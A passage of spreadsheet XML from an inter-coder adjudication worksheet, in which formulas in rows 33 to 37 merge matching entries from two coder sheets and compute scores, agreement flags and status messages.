        <f>IF(AND(Coder1!F33&amp;""&lt;&gt;"",Coder1!F33&amp;""=Coder2!F33&amp;""),Coder1!F33,"")</f>
        <v/>
      </c>
      <c r="G33" s="14">
        <f>IF(AND(Coder1!G33&amp;""&lt;&gt;"",Coder1!G33&amp;""=Coder2!G33&amp;""),Coder1!G33,"")</f>
        <v/>
      </c>
      <c r="H33" s="14">
        <f>IF(AND(Coder1!H33&amp;""&lt;&gt;"",Coder1!H33&amp;""=Coder2!H33&amp;""),Coder1!H33,"")</f>
        <v/>
      </c>
      <c r="I33" s="14">
        <f>IF(AND(Coder1!I33&amp;""&lt;&gt;"",Coder1!I33&amp;""=Coder2!I33&amp;""),Coder1!I33,"")</f>
        <v/>
      </c>
      <c r="J33" s="14">
        <f>IF(AND(Coder1!J33&amp;""&lt;&gt;"",Coder1!J33&amp;""=Coder2!J33&amp;""),Coder1!J33,"")</f>
        <v/>
      </c>
      <c r="K33" s="14">
        <f>IF(AND(Coder1!K33&amp;""&lt;&gt;"",Coder1!K33&amp;""=Coder2!K33&amp;""),Coder1!K33,"")</f>
        <v/>
      </c>
      <c r="L33" s="14">
        <f>IF(AND(Coder1!L33&amp;""&lt;&gt;"",Coder1!L33&amp;""=Coder2!L33&amp;""),Coder1!L33,"")</f>
        <v/>
      </c>
      <c r="M33" s="14">
        <f>IF(AND(Coder1!M33&amp;""&lt;&gt;"",Coder1!M33&amp;""=Coder2!M33&amp;""),Coder1!M33,"")</f>
        <v/>
      </c>
      <c r="N33" s="14">
        <f>IF(AND(Coder1!N33&amp;""&lt;&gt;"",Coder1!N33&amp;""=Coder2!N33&amp;""),Coder1!N33,"")</f>
        <v/>
      </c>
      <c r="O33" s="14">
        <f>IF(AND(Coder1!O33&amp;""&lt;&gt;"",Coder1!O33&amp;""=Coder2!O33&amp;""),Coder1!O33,"")</f>
        <v/>
      </c>
      <c r="P33" s="14">
        <f>IF(AND(Coder1!P33&amp;""&lt;&gt;"",Coder1!P33&amp;""=Coder2!P33&amp;""),Coder1!P33,"")</f>
        <v/>
      </c>
      <c r="Q33" s="14">
        <f>IF(AND(Coder1!Q33&amp;""&lt;&gt;"",Coder1!Q33&amp;""=Coder2!Q33&amp;""),Coder1!Q33,"")</f>
        <v/>
      </c>
      <c r="R33" s="14">
        <f>IF(AND(Coder1!R33&amp;""&lt;&gt;"",Coder1!R33&amp;""=Coder2!R33&amp;""),Coder1!R33,"")</f>
        <v/>
      </c>
      <c r="S33" s="14">
        <f>IF(AND(Coder1!S33&amp;""&lt;&gt;"",Coder1!S33&amp;""=Coder2!S33&amp;""),Coder1!S33,"")</f>
        <v/>
      </c>
      <c r="T33" s="14">
        <f>IF(AND(Coder1!T33&amp;""&lt;&gt;"",Coder1!T33&amp;""=Coder2!T33&amp;""),Coder1!T33,"")</f>
        <v/>
      </c>
      <c r="U33" s="14">
        <f>IF(AND(Coder1!U33&amp;""&lt;&gt;"",Coder1!U33&amp;""=Coder2!U33&amp;""),Coder1!U33,"")</f>
        <v/>
      </c>
      <c r="V33" s="14">
        <f>IF(AND(Coder1!V33&amp;""&lt;&gt;"",Coder1!V33&amp;""=Coder2!V33&amp;""),Coder1!V33,"")</f>
        <v/>
      </c>
      <c r="W33" s="14">
        <f>IF(AND(Coder1!W33&amp;""&lt;&gt;"",Coder1!W33&amp;""=Coder2!W33&amp;""),Coder1!W33,"")</f>
        <v/>
      </c>
      <c r="X33" s="14">
        <f>IF(AND(Coder1!X33&amp;""&lt;&gt;"",Coder1!X33&amp;""=Coder2!X33&amp;""),Coder1!X33,"")</f>
        <v/>
      </c>
      <c r="Y33" s="14">
        <f>IF(AND(Coder1!Y33&amp;""&lt;&gt;"",Coder1!Y33&amp;""=Coder2!Y33&amp;""),Coder1!Y33,"")</f>
        <v/>
      </c>
      <c r="Z33" s="14">
        <f>IF(AND(Coder1!Z33&amp;""&lt;&gt;"",Coder1!Z33&amp;""=Coder2!Z33&amp;""),Coder1!Z33,"")</f>
        <v/>
      </c>
      <c r="AA33" s="14">
        <f>IF(AND(Coder1!AA33&amp;""&lt;&gt;"",Coder1!AA33&amp;""=Coder2!AA33&amp;""),Coder1!AA33,"")</f>
        <v/>
      </c>
      <c r="AB33" s="14">
        <f>IF(AND(Coder1!AB33&amp;""&lt;&gt;"",Coder1!AB33&amp;""=Coder2!AB33&amp;""),Coder1!AB33,"")</f>
        <v/>
      </c>
      <c r="AC33" s="14">
        <f>IF(AND(Coder1!AC33&amp;""&lt;&gt;"",Coder1!AC33&amp;""=Coder2!AC33&amp;""),Coder1!AC33,"")</f>
        <v/>
      </c>
      <c r="AD33" s="14">
        <f>IF(AND(Coder1!AD33&amp;""&lt;&gt;"",Coder1!AD33&amp;""=Coder2!AD33&amp;""),Coder1!AD33,"")</f>
        <v/>
      </c>
      <c r="AE33" s="14">
        <f>IF(AND(Coder1!AE33&amp;""&lt;&gt;"",Coder1!AE33&amp;""=Coder2!AE33&amp;""),Coder1!AE33,"")</f>
        <v/>
      </c>
      <c r="AF33" s="14">
        <f>IF(AND(Coder1!AF33&amp;""&lt;&gt;"",Coder1!AF33&amp;""=Coder2!AF33&amp;""),Coder1!AF33,"")</f>
        <v/>
      </c>
      <c r="AG33" s="14">
        <f>IF(AND(Coder1!AG33&amp;""&lt;&gt;"",Coder1!AG33&amp;""=Coder2!AG33&amp;""),Coder1!AG33,"")</f>
        <v/>
      </c>
      <c r="AH33" s="14">
        <f>IF(AND(Coder1!AH33&amp;""&lt;&gt;"",Coder1!AH33&amp;""=Coder2!AH33&amp;""),Coder1!AH33,"")</f>
        <v/>
      </c>
      <c r="AI33" s="11">
        <f>IF(COUNT(E33:L33)=0,"",SUM(E33:L33))</f>
        <v/>
      </c>
      <c r="AJ33" s="11">
        <f>IF(AI33="","",N(E33)*3+N(F33)*2+N(G33)*2+N(H33)*2+N(I33)*2+N(J33)*3+N(K33)*3+N(L33)*3)</f>
        <v/>
      </c>
      <c r="AK33" s="11">
        <f>IF(AI33="","",COUNTIF(N33:AG33,1))</f>
        <v/>
      </c>
      <c r="AL33" s="11">
        <f>IF(OR(AJ33="",AJ33=0),"",ROUND(100*(AJ33-AK33)/AJ33,1))</f>
        <v/>
      </c>
      <c r="AM33" s="11">
        <f>IF(AND(Coder1!AN33=1,Coder2!AN33=1),IF(COUNTBLANK(E33:AH33)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN33" s="11">
        <f>IF(AND(Coder1!AN33=1,Coder2!AN33=1),IF(SUMPRODUCT(--(Coder1!E33:AH33&amp;""&lt;&gt;Coder2!E33:AH33&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO33" s="11" t="n"/>
    </row>
    <row r="34">
      <c r="A34" s="11">
        <f>Coder1!A34</f>
        <v/>
      </c>
      <c r="B34" s="11">
        <f>Coder1!B34</f>
        <v/>
      </c>
      <c r="C34" s="11">
        <f>Coder1!C34</f>
        <v/>
      </c>
      <c r="D34" s="11">
        <f>Coder1!D34</f>
        <v/>
      </c>
      <c r="E34" s="14">
        <f>IF(AND(Coder1!E34&amp;""&lt;&gt;"",Coder1!E34&amp;""=Coder2!E34&amp;""),Coder1!E34,"")</f>
        <v/>
      </c>
      <c r="F34" s="14">
        <f>IF(AND(Coder1!F34&amp;""&lt;&gt;"",Coder1!F34&amp;""=Coder2!F34&amp;""),Coder1!F34,"")</f>
        <v/>
      </c>
      <c r="G34" s="14">
        <f>IF(AND(Coder1!G34&amp;""&lt;&gt;"",Coder1!G34&amp;""=Coder2!G34&amp;""),Coder1!G34,"")</f>
        <v/>
      </c>
      <c r="H34" s="14">
        <f>IF(AND(Coder1!H34&amp;""&lt;&gt;"",Coder1!H34&amp;""=Coder2!H34&amp;""),Coder1!H34,"")</f>
        <v/>
      </c>
      <c r="I34" s="14">
        <f>IF(AND(Coder1!I34&amp;""&lt;&gt;"",Coder1!I34&amp;""=Coder2!I34&amp;""),Coder1!I34,"")</f>
        <v/>
      </c>
      <c r="J34" s="14">
        <f>IF(AND(Coder1!J34&amp;""&lt;&gt;"",Coder1!J34&amp;""=Coder2!J34&amp;""),Coder1!J34,"")</f>
        <v/>
      </c>
      <c r="K34" s="14">
        <f>IF(AND(Coder1!K34&amp;""&lt;&gt;"",Coder1!K34&amp;""=Coder2!K34&amp;""),Coder1!K34,"")</f>
        <v/>
      </c>
      <c r="L34" s="14">
        <f>IF(AND(Coder1!L34&amp;""&lt;&gt;"",Coder1!L34&amp;""=Coder2!L34&amp;""),Coder1!L34,"")</f>
        <v/>
      </c>
      <c r="M34" s="14">
        <f>IF(AND(Coder1!M34&amp;""&lt;&gt;"",Coder1!M34&amp;""=Coder2!M34&amp;""),Coder1!M34,"")</f>
        <v/>
      </c>
      <c r="N34" s="14">
        <f>IF(AND(Coder1!N34&amp;""&lt;&gt;"",Coder1!N34&amp;""=Coder2!N34&amp;""),Coder1!N34,"")</f>
        <v/>
      </c>
      <c r="O34" s="14">
        <f>IF(AND(Coder1!O34&amp;""&lt;&gt;"",Coder1!O34&amp;""=Coder2!O34&amp;""),Coder1!O34,"")</f>
        <v/>
      </c>
      <c r="P34" s="14">
        <f>IF(AND(Coder1!P34&amp;""&lt;&gt;"",Coder1!P34&amp;""=Coder2!P34&amp;""),Coder1!P34,"")</f>
        <v/>
      </c>
      <c r="Q34" s="14">
        <f>IF(AND(Coder1!Q34&amp;""&lt;&gt;"",Coder1!Q34&amp;""=Coder2!Q34&amp;""),Coder1!Q34,"")</f>
        <v/>
      </c>
      <c r="R34" s="14">
        <f>IF(AND(Coder1!R34&amp;""&lt;&gt;"",Coder1!R34&amp;""=Coder2!R34&amp;""),Coder1!R34,"")</f>
        <v/>
      </c>
      <c r="S34" s="14">
        <f>IF(AND(Coder1!S34&amp;""&lt;&gt;"",Coder1!S34&amp;""=Coder2!S34&amp;""),Coder1!S34,"")</f>
        <v/>
      </c>
      <c r="T34" s="14">
        <f>IF(AND(Coder1!T34&amp;""&lt;&gt;"",Coder1!T34&amp;""=Coder2!T34&amp;""),Coder1!T34,"")</f>
        <v/>
      </c>
      <c r="U34" s="14">
        <f>IF(AND(Coder1!U34&amp;""&lt;&gt;"",Coder1!U34&amp;""=Coder2!U34&amp;""),Coder1!U34,"")</f>
        <v/>
      </c>
      <c r="V34" s="14">
        <f>IF(AND(Coder1!V34&amp;""&lt;&gt;"",Coder1!V34&amp;""=Coder2!V34&amp;""),Coder1!V34,"")</f>
        <v/>
      </c>
      <c r="W34" s="14">
        <f>IF(AND(Coder1!W34&amp;""&lt;&gt;"",Coder1!W34&amp;""=Coder2!W34&amp;""),Coder1!W34,"")</f>
        <v/>
      </c>
      <c r="X34" s="14">
        <f>IF(AND(Coder1!X34&amp;""&lt;&gt;"",Coder1!X34&amp;""=Coder2!X34&amp;""),Coder1!X34,"")</f>
        <v/>
      </c>
      <c r="Y34" s="14">
        <f>IF(AND(Coder1!Y34&amp;""&lt;&gt;"",Coder1!Y34&amp;""=Coder2!Y34&amp;""),Coder1!Y34,"")</f>
        <v/>
      </c>
      <c r="Z34" s="14">
        <f>IF(AND(Coder1!Z34&amp;""&lt;&gt;"",Coder1!Z34&amp;""=Coder2!Z34&amp;""),Coder1!Z34,"")</f>
        <v/>
      </c>
      <c r="AA34" s="14">
        <f>IF(AND(Coder1!AA34&amp;""&lt;&gt;"",Coder1!AA34&amp;""=Coder2!AA34&amp;""),Coder1!AA34,"")</f>
        <v/>
      </c>
      <c r="AB34" s="14">
        <f>IF(AND(Coder1!AB34&amp;""&lt;&gt;"",Coder1!AB34&amp;""=Coder2!AB34&amp;""),Coder1!AB34,"")</f>
        <v/>
      </c>
      <c r="AC34" s="14">
        <f>IF(AND(Coder1!AC34&amp;""&lt;&gt;"",Coder1!AC34&amp;""=Coder2!AC34&amp;""),Coder1!AC34,"")</f>
        <v/>
      </c>
      <c r="AD34" s="14">
        <f>IF(AND(Coder1!AD34&amp;""&lt;&gt;"",Coder1!AD34&amp;""=Coder2!AD34&amp;""),Coder1!AD34,"")</f>
        <v/>
      </c>
      <c r="AE34" s="14">
        <f>IF(AND(Coder1!AE34&amp;""&lt;&gt;"",Coder1!AE34&amp;""=Coder2!AE34&amp;""),Coder1!AE34,"")</f>
        <v/>
      </c>
      <c r="AF34" s="14">
        <f>IF(AND(Coder1!AF34&amp;""&lt;&gt;"",Coder1!AF34&amp;""=Coder2!AF34&amp;""),Coder1!AF34,"")</f>
        <v/>
      </c>
      <c r="AG34" s="14">
        <f>IF(AND(Coder1!AG34&amp;""&lt;&gt;"",Coder1!AG34&amp;""=Coder2!AG34&amp;""),Coder1!AG34,"")</f>
        <v/>
      </c>
      <c r="AH34" s="14">
        <f>IF(AND(Coder1!AH34&amp;""&lt;&gt;"",Coder1!AH34&amp;""=Coder2!AH34&amp;""),Coder1!AH34,"")</f>
        <v/>
      </c>
      <c r="AI34" s="11">
        <f>IF(COUNT(E34:L34)=0,"",SUM(E34:L34))</f>
        <v/>
      </c>
      <c r="AJ34" s="11">
        <f>IF(AI34="","",N(E34)*3+N(F34)*2+N(G34)*2+N(H34)*2+N(I34)*2+N(J34)*3+N(K34)*3+N(L34)*3)</f>
        <v/>
      </c>
      <c r="AK34" s="11">
        <f>IF(AI34="","",COUNTIF(N34:AG34,1))</f>
        <v/>
      </c>
      <c r="AL34" s="11">
        <f>IF(OR(AJ34="",AJ34=0),"",ROUND(100*(AJ34-AK34)/AJ34,1))</f>
        <v/>
      </c>
      <c r="AM34" s="11">
        <f>IF(AND(Coder1!AN34=1,Coder2!AN34=1),IF(COUNTBLANK(E34:AH34)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN34" s="11">
        <f>IF(AND(Coder1!AN34=1,Coder2!AN34=1),IF(SUMPRODUCT(--(Coder1!E34:AH34&amp;""&lt;&gt;Coder2!E34:AH34&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO34" s="11" t="n"/>
    </row>
    <row r="35">
      <c r="A35" s="11">
        <f>Coder1!A35</f>
        <v/>
      </c>
      <c r="B35" s="11">
        <f>Coder1!B35</f>
        <v/>
      </c>
      <c r="C35" s="11">
        <f>Coder1!C35</f>
        <v/>
      </c>
      <c r="D35" s="11">
        <f>Coder1!D35</f>
        <v/>
      </c>
      <c r="E35" s="14">
        <f>IF(AND(Coder1!E35&amp;""&lt;&gt;"",Coder1!E35&amp;""=Coder2!E35&amp;""),Coder1!E35,"")</f>
        <v/>
      </c>
      <c r="F35" s="14">
        <f>IF(AND(Coder1!F35&amp;""&lt;&gt;"",Coder1!F35&amp;""=Coder2!F35&amp;""),Coder1!F35,"")</f>
        <v/>
      </c>
      <c r="G35" s="14">
        <f>IF(AND(Coder1!G35&amp;""&lt;&gt;"",Coder1!G35&amp;""=Coder2!G35&amp;""),Coder1!G35,"")</f>
        <v/>
      </c>
      <c r="H35" s="14">
        <f>IF(AND(Coder1!H35&amp;""&lt;&gt;"",Coder1!H35&amp;""=Coder2!H35&amp;""),Coder1!H35,"")</f>
        <v/>
      </c>
      <c r="I35" s="14">
        <f>IF(AND(Coder1!I35&amp;""&lt;&gt;"",Coder1!I35&amp;""=Coder2!I35&amp;""),Coder1!I35,"")</f>
        <v/>
      </c>
      <c r="J35" s="14">
        <f>IF(AND(Coder1!J35&amp;""&lt;&gt;"",Coder1!J35&amp;""=Coder2!J35&amp;""),Coder1!J35,"")</f>
        <v/>
      </c>
      <c r="K35" s="14">
        <f>IF(AND(Coder1!K35&amp;""&lt;&gt;"",Coder1!K35&amp;""=Coder2!K35&amp;""),Coder1!K35,"")</f>
        <v/>
      </c>
      <c r="L35" s="14">
        <f>IF(AND(Coder1!L35&amp;""&lt;&gt;"",Coder1!L35&amp;""=Coder2!L35&amp;""),Coder1!L35,"")</f>
        <v/>
      </c>
      <c r="M35" s="14">
        <f>IF(AND(Coder1!M35&amp;""&lt;&gt;"",Coder1!M35&amp;""=Coder2!M35&amp;""),Coder1!M35,"")</f>
        <v/>
      </c>
      <c r="N35" s="14">
        <f>IF(AND(Coder1!N35&amp;""&lt;&gt;"",Coder1!N35&amp;""=Coder2!N35&amp;""),Coder1!N35,"")</f>
        <v/>
      </c>
      <c r="O35" s="14">
        <f>IF(AND(Coder1!O35&amp;""&lt;&gt;"",Coder1!O35&amp;""=Coder2!O35&amp;""),Coder1!O35,"")</f>
        <v/>
      </c>
      <c r="P35" s="14">
        <f>IF(AND(Coder1!P35&amp;""&lt;&gt;"",Coder1!P35&amp;""=Coder2!P35&amp;""),Coder1!P35,"")</f>
        <v/>
      </c>
      <c r="Q35" s="14">
        <f>IF(AND(Coder1!Q35&amp;""&lt;&gt;"",Coder1!Q35&amp;""=Coder2!Q35&amp;""),Coder1!Q35,"")</f>
        <v/>
      </c>
      <c r="R35" s="14">
        <f>IF(AND(Coder1!R35&amp;""&lt;&gt;"",Coder1!R35&amp;""=Coder2!R35&amp;""),Coder1!R35,"")</f>
        <v/>
      </c>
      <c r="S35" s="14">
        <f>IF(AND(Coder1!S35&amp;""&lt;&gt;"",Coder1!S35&amp;""=Coder2!S35&amp;""),Coder1!S35,"")</f>
        <v/>
      </c>
      <c r="T35" s="14">
        <f>IF(AND(Coder1!T35&amp;""&lt;&gt;"",Coder1!T35&amp;""=Coder2!T35&amp;""),Coder1!T35,"")</f>
        <v/>
      </c>
      <c r="U35" s="14">
        <f>IF(AND(Coder1!U35&amp;""&lt;&gt;"",Coder1!U35&amp;""=Coder2!U35&amp;""),Coder1!U35,"")</f>
        <v/>
      </c>
      <c r="V35" s="14">
        <f>IF(AND(Coder1!V35&amp;""&lt;&gt;"",Coder1!V35&amp;""=Coder2!V35&amp;""),Coder1!V35,"")</f>
        <v/>
      </c>
      <c r="W35" s="14">
        <f>IF(AND(Coder1!W35&amp;""&lt;&gt;"",Coder1!W35&amp;""=Coder2!W35&amp;""),Coder1!W35,"")</f>
        <v/>
      </c>
      <c r="X35" s="14">
        <f>IF(AND(Coder1!X35&amp;""&lt;&gt;"",Coder1!X35&amp;""=Coder2!X35&amp;""),Coder1!X35,"")</f>
        <v/>
      </c>
      <c r="Y35" s="14">
        <f>IF(AND(Coder1!Y35&amp;""&lt;&gt;"",Coder1!Y35&amp;""=Coder2!Y35&amp;""),Coder1!Y35,"")</f>
        <v/>
      </c>
      <c r="Z35" s="14">
        <f>IF(AND(Coder1!Z35&amp;""&lt;&gt;"",Coder1!Z35&amp;""=Coder2!Z35&amp;""),Coder1!Z35,"")</f>
        <v/>
      </c>
      <c r="AA35" s="14">
        <f>IF(AND(Coder1!AA35&amp;""&lt;&gt;"",Coder1!AA35&amp;""=Coder2!AA35&amp;""),Coder1!AA35,"")</f>
        <v/>
      </c>
      <c r="AB35" s="14">
        <f>IF(AND(Coder1!AB35&amp;""&lt;&gt;"",Coder1!AB35&amp;""=Coder2!AB35&amp;""),Coder1!AB35,"")</f>
        <v/>
      </c>
      <c r="AC35" s="14">
        <f>IF(AND(Coder1!AC35&amp;""&lt;&gt;"",Coder1!AC35&amp;""=Coder2!AC35&amp;""),Coder1!AC35,"")</f>
        <v/>
      </c>
      <c r="AD35" s="14">
        <f>IF(AND(Coder1!AD35&amp;""&lt;&gt;"",Coder1!AD35&amp;""=Coder2!AD35&amp;""),Coder1!AD35,"")</f>
        <v/>
      </c>
      <c r="AE35" s="14">
        <f>IF(AND(Coder1!AE35&amp;""&lt;&gt;"",Coder1!AE35&amp;""=Coder2!AE35&amp;""),Coder1!AE35,"")</f>
        <v/>
      </c>
      <c r="AF35" s="14">
        <f>IF(AND(Coder1!AF35&amp;""&lt;&gt;"",Coder1!AF35&amp;""=Coder2!AF35&amp;""),Coder1!AF35,"")</f>
        <v/>
      </c>
      <c r="AG35" s="14">
        <f>IF(AND(Coder1!AG35&amp;""&lt;&gt;"",Coder1!AG35&amp;""=Coder2!AG35&amp;""),Coder1!AG35,"")</f>
        <v/>
      </c>
      <c r="AH35" s="14">
        <f>IF(AND(Coder1!AH35&amp;""&lt;&gt;"",Coder1!AH35&amp;""=Coder2!AH35&amp;""),Coder1!AH35,"")</f>
        <v/>
      </c>
      <c r="AI35" s="11">
        <f>IF(COUNT(E35:L35)=0,"",SUM(E35:L35))</f>
        <v/>
      </c>
      <c r="AJ35" s="11">
        <f>IF(AI35="","",N(E35)*3+N(F35)*2+N(G35)*2+N(H35)*2+N(I35)*2+N(J35)*3+N(K35)*3+N(L35)*3)</f>
        <v/>
      </c>
      <c r="AK35" s="11">
        <f>IF(AI35="","",COUNTIF(N35:AG35,1))</f>
        <v/>
      </c>
      <c r="AL35" s="11">
        <f>IF(OR(AJ35="",AJ35=0),"",ROUND(100*(AJ35-AK35)/AJ35,1))</f>
        <v/>
      </c>
      <c r="AM35" s="11">
        <f>IF(AND(Coder1!AN35=1,Coder2!AN35=1),IF(COUNTBLANK(E35:AH35)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN35" s="11">
        <f>IF(AND(Coder1!AN35=1,Coder2!AN35=1),IF(SUMPRODUCT(--(Coder1!E35:AH35&amp;""&lt;&gt;Coder2!E35:AH35&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO35" s="11" t="n"/>
    </row>
    <row r="36">
      <c r="A36" s="11">
        <f>Coder1!A36</f>
        <v/>
      </c>
      <c r="B36" s="11">
        <f>Coder1!B36</f>
        <v/>
      </c>
      <c r="C36" s="11">
        <f>Coder1!C36</f>
        <v/>
      </c>
      <c r="D36" s="11">
        <f>Coder1!D36</f>
        <v/>
      </c>
      <c r="E36" s="14">
        <f>IF(AND(Coder1!E36&amp;""&lt;&gt;"",Coder1!E36&amp;""=Coder2!E36&amp;""),Coder1!E36,"")</f>
        <v/>
      </c>
      <c r="F36" s="14">
        <f>IF(AND(Coder1!F36&amp;""&lt;&gt;"",Coder1!F36&amp;""=Coder2!F36&amp;""),Coder1!F36,"")</f>
        <v/>
      </c>
      <c r="G36" s="14">
        <f>IF(AND(Coder1!G36&amp;""&lt;&gt;"",Coder1!G36&amp;""=Coder2!G36&amp;""),Coder1!G36,"")</f>
        <v/>
      </c>
      <c r="H36" s="14">
        <f>IF(AND(Coder1!H36&amp;""&lt;&gt;"",Coder1!H36&amp;""=Coder2!H36&amp;""),Coder1!H36,"")</f>
        <v/>
      </c>
      <c r="I36" s="14">
        <f>IF(AND(Coder1!I36&amp;""&lt;&gt;"",Coder1!I36&amp;""=Coder2!I36&amp;""),Coder1!I36,"")</f>
        <v/>
      </c>
      <c r="J36" s="14">
        <f>IF(AND(Coder1!J36&amp;""&lt;&gt;"",Coder1!J36&amp;""=Coder2!J36&amp;""),Coder1!J36,"")</f>
        <v/>
      </c>
      <c r="K36" s="14">
        <f>IF(AND(Coder1!K36&amp;""&lt;&gt;"",Coder1!K36&amp;""=Coder2!K36&amp;""),Coder1!K36,"")</f>
        <v/>
      </c>
      <c r="L36" s="14">
        <f>IF(AND(Coder1!L36&amp;""&lt;&gt;"",Coder1!L36&amp;""=Coder2!L36&amp;""),Coder1!L36,"")</f>
        <v/>
      </c>
      <c r="M36" s="14">
        <f>IF(AND(Coder1!M36&amp;""&lt;&gt;"",Coder1!M36&amp;""=Coder2!M36&amp;""),Coder1!M36,"")</f>
        <v/>
      </c>
      <c r="N36" s="14">
        <f>IF(AND(Coder1!N36&amp;""&lt;&gt;"",Coder1!N36&amp;""=Coder2!N36&amp;""),Coder1!N36,"")</f>
        <v/>
      </c>
      <c r="O36" s="14">
        <f>IF(AND(Coder1!O36&amp;""&lt;&gt;"",Coder1!O36&amp;""=Coder2!O36&amp;""),Coder1!O36,"")</f>
        <v/>
      </c>
      <c r="P36" s="14">
        <f>IF(AND(Coder1!P36&amp;""&lt;&gt;"",Coder1!P36&amp;""=Coder2!P36&amp;""),Coder1!P36,"")</f>
        <v/>
      </c>
      <c r="Q36" s="14">
        <f>IF(AND(Coder1!Q36&amp;""&lt;&gt;"",Coder1!Q36&amp;""=Coder2!Q36&amp;""),Coder1!Q36,"")</f>
        <v/>
      </c>
      <c r="R36" s="14">
        <f>IF(AND(Coder1!R36&amp;""&lt;&gt;"",Coder1!R36&amp;""=Coder2!R36&amp;""),Coder1!R36,"")</f>
        <v/>
      </c>
      <c r="S36" s="14">
        <f>IF(AND(Coder1!S36&amp;""&lt;&gt;"",Coder1!S36&amp;""=Coder2!S36&amp;""),Coder1!S36,"")</f>
        <v/>
      </c>
      <c r="T36" s="14">
        <f>IF(AND(Coder1!T36&amp;""&lt;&gt;"",Coder1!T36&amp;""=Coder2!T36&amp;""),Coder1!T36,"")</f>
        <v/>
      </c>
      <c r="U36" s="14">
        <f>IF(AND(Coder1!U36&amp;""&lt;&gt;"",Coder1!U36&amp;""=Coder2!U36&amp;""),Coder1!U36,"")</f>
        <v/>
      </c>
      <c r="V36" s="14">
        <f>IF(AND(Coder1!V36&amp;""&lt;&gt;"",Coder1!V36&amp;""=Coder2!V36&amp;""),Coder1!V36,"")</f>
        <v/>
      </c>
      <c r="W36" s="14">
        <f>IF(AND(Coder1!W36&amp;""&lt;&gt;"",Coder1!W36&amp;""=Coder2!W36&amp;""),Coder1!W36,"")</f>
        <v/>
      </c>
      <c r="X36" s="14">
        <f>IF(AND(Coder1!X36&amp;""&lt;&gt;"",Coder1!X36&amp;""=Coder2!X36&amp;""),Coder1!X36,"")</f>
        <v/>
      </c>
      <c r="Y36" s="14">
        <f>IF(AND(Coder1!Y36&amp;""&lt;&gt;"",Coder1!Y36&amp;""=Coder2!Y36&amp;""),Coder1!Y36,"")</f>
        <v/>
      </c>
      <c r="Z36" s="14">
        <f>IF(AND(Coder1!Z36&amp;""&lt;&gt;"",Coder1!Z36&amp;""=Coder2!Z36&amp;""),Coder1!Z36,"")</f>
        <v/>
      </c>
      <c r="AA36" s="14">
        <f>IF(AND(Coder1!AA36&amp;""&lt;&gt;"",Coder1!AA36&amp;""=Coder2!AA36&amp;""),Coder1!AA36,"")</f>
        <v/>
      </c>
      <c r="AB36" s="14">
        <f>IF(AND(Coder1!AB36&amp;""&lt;&gt;"",Coder1!AB36&amp;""=Coder2!AB36&amp;""),Coder1!AB36,"")</f>
        <v/>
      </c>
      <c r="AC36" s="14">
        <f>IF(AND(Coder1!AC36&amp;""&lt;&gt;"",Coder1!AC36&amp;""=Coder2!AC36&amp;""),Coder1!AC36,"")</f>
        <v/>
      </c>
      <c r="AD36" s="14">
        <f>IF(AND(Coder1!AD36&amp;""&lt;&gt;"",Coder1!AD36&amp;""=Coder2!AD36&amp;""),Coder1!AD36,"")</f>
        <v/>
      </c>
      <c r="AE36" s="14">
        <f>IF(AND(Coder1!AE36&amp;""&lt;&gt;"",Coder1!AE36&amp;""=Coder2!AE36&amp;""),Coder1!AE36,"")</f>
        <v/>
      </c>
      <c r="AF36" s="14">
        <f>IF(AND(Coder1!AF36&amp;""&lt;&gt;"",Coder1!AF36&amp;""=Coder2!AF36&amp;""),Coder1!AF36,"")</f>
        <v/>
      </c>
      <c r="AG36" s="14">
        <f>IF(AND(Coder1!AG36&amp;""&lt;&gt;"",Coder1!AG36&amp;""=Coder2!AG36&amp;""),Coder1!AG36,"")</f>
        <v/>
      </c>
      <c r="AH36" s="14">
        <f>IF(AND(Coder1!AH36&amp;""&lt;&gt;"",Coder1!AH36&amp;""=Coder2!AH36&amp;""),Coder1!AH36,"")</f>
        <v/>
      </c>
      <c r="AI36" s="11">
        <f>IF(COUNT(E36:L36)=0,"",SUM(E36:L36))</f>
        <v/>
      </c>
      <c r="AJ36" s="11">
        <f>IF(AI36="","",N(E36)*3+N(F36)*2+N(G36)*2+N(H36)*2+N(I36)*2+N(J36)*3+N(K36)*3+N(L36)*3)</f>
        <v/>
      </c>
      <c r="AK36" s="11">
        <f>IF(AI36="","",COUNTIF(N36:AG36,1))</f>
        <v/>
      </c>
      <c r="AL36" s="11">
        <f>IF(OR(AJ36="",AJ36=0),"",ROUND(100*(AJ36-AK36)/AJ36,1))</f>
        <v/>
      </c>
      <c r="AM36" s="11">
        <f>IF(AND(Coder1!AN36=1,Coder2!AN36=1),IF(COUNTBLANK(E36:AH36)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN36" s="11">
        <f>IF(AND(Coder1!AN36=1,Coder2!AN36=1),IF(SUMPRODUCT(--(Coder1!E36:AH36&amp;""&lt;&gt;Coder2!E36:AH36&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO36" s="11" t="n"/>
    </row>
    <row r="37">
      <c r="A37" s="11">
        <f>Coder1!A37</f>
        <v/>
      </c>
      <c r="B37" s="11">
        <f>Coder1!B37</f>
        <v/>
      </c>
      <c r="C37" s="11">
        <f>Coder1!C37</f>
        <v/>
      </c>
      <c r="D37" s="11">
        <f>Coder1!D37</f>
        <v/>
      </c>
      <c r="E37" s="14">
        <f>IF(AND(Coder1!E37&amp;""&lt;&gt;"",Coder1!E37&amp;""=Coder2!E37&amp;""),Coder1!E37,"")</f>
        <v/>
      </c>
      <c r="F37" s="14">
        <f>IF(AND(Coder1!F37&amp;""&lt;&gt;"",Coder1!F37&amp;""=Coder2!F37&amp;""),Coder1!F37,"")</f>
        <v/>
      </c>
      <c r="G37" s="14">
        <f>IF(AND(Coder1!G37&amp;""&lt;&gt;"",Coder1!G37&amp;""=Coder2!G37&amp;""),Coder1!G37,"")</f>
        <v/>
      </c>
      <c r="H37" s="14">
        <f>IF(AND(Coder1!H37&amp;""&lt;&gt;"",Coder1!H37&amp;""=Coder2!H37&amp;""),Coder1!H37,"")</f>
        <v/>
      </c>
      <c r="I37" s="14">
